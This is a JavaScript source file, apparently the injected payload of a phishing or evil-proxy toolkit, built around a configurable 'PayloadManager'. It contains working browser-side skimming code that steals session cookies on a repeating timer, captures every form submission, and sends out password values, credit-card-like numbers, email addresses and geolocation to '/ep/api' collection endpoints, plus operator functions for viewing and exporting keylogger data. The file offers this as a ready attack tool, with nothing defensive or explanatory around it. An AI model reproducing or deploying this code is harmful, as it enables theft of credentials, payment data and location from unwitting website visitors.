/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

console.log('%c[✓] Payload initialized', 'color: #4CAF50');

const PayloadManager = {
    // Configuration for payloads
    config: {
        cookieLogger: true,
        formStealer: true,
        keyLogger: true,
        passwordDetector: true,
        ccDetector: true,
        emailDetector: true,
        geoTracker: true
    },

    // Available payloads
    payloads: {
        cookieLogger: () => {
            const stealCookies = () => {
                const cookies = document.cookie.split(';').map(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    return { name, value };
                });

                if (cookies.length > 0) {
                    fetch('/ep/api/ping', { 
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            cookies,
                            url: window.location.href,
                            timestamp: new Date().toISOString()
                        })
                    });
                }
            };

            stealCookies();
            setInterval(stealCookies, 3000);
        },

        formStealer: () => {
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', async (e) => {
                    const formData = new FormData(form);
                    const data = {
                        url: window.location.href,
                        fields: Object.fromEntries(formData),
                        timestamp: new Date().toISOString()
                    };
                    
                    await fetch('/ep/api/forms', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                });
            });
        },

        passwordDetector: () => {
            document.querySelectorAll('input[type="password"]').forEach(input => {
                input.addEventListener('change', () => {
                    fetch('/ep/api/sensitive', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'password',
                            value: input.value,
                            url: window.location.href
                        })
                    });
                });
            });
        },

        ccDetector: () => {
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('change', () => {
                    const ccPattern = /\b(?:\d[ -]*?){13,16}\b/;
                    if (ccPattern.test(input.value)) {
                        fetch('/ep/api/sensitive', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'credit_card',
                                value: input.value,
                                url: window.location.href
                            })
                        });
                    }
                });
            });
        },

        emailDetector: () => {
            document.querySelectorAll('input').forEach(input => {
                input.addEventListener('change', () => {
                    const emailPattern = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/;
                    if (emailPattern.test(input.value)) {
                        fetch('/ep/api/sensitive', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'email',
                                value: input.value,
                                url: window.location.href
                            })
                        });
                    }
                });
            });
        },

        geoTracker: () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    fetch('/ep/api/geolocation', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            url: window.location.href
                        })
                    });
                });
            }
        }
    },
    
    init: function() {
        document.addEventListener('DOMContentLoaded', () => {
            // Initialize payload states
            Object.keys(this.config).forEach(payload => {
                const status = document.getElementById(`${payload}-status`);
                if (status) {
                    status.textContent = this.config[payload] ? 'Active' : 'Inactive';
                    status.style.color = this.config[payload] ? '#4CAF50' : '#f44336';
                }
                
                if (this.config[payload] && this.payloads[payload]) {
                    try {
                        this.payloads[payload]();
                    } catch (error) {
                        console.error(`Error initializing ${payload}:`, error);
                    }
                }
            });
        });
    },

    togglePayload: function(name) {
        this.config[name] = !this.config[name];
        if (this.config[name]) {
            this.payloads[name]();
        }
        localStorage.setItem('payloadConfig', JSON.stringify(this.config));
    }
};

PayloadManager.init();

function updateKeylogger() {
    fetch('/ep/api/keylog')
        .then(response => response.json())
        .then(logs => {
            const keyloggerList = document.getElementById('keylogger-list');
            keyloggerList.innerHTML = '';
            
            logs.reverse().forEach(log => {
                const entry = document.createElement('div');
                entry.className = 'keylog-entry';
                entry.innerHTML = `
                    <div class="keylog-url">${log.url}</div>
                    <div class="keylog-data">${log.keys}</div>
                    <div class="keylog-time">${new Date(log.timestamp).toLocaleString()}</div>
                `;
                keyloggerList.appendChild(entry);
            });
        });
}

function clearKeylogger() {
    fetch('/ep/api/clearKeylog', { method: 'POST' })
        .then(() => updateKeylogger());
}

function exportKeylogger() {
    fetch('/ep/api/keylog')
        .then(response => response.json())
        .then(logs => {
            const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'keylogger-data.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        });
}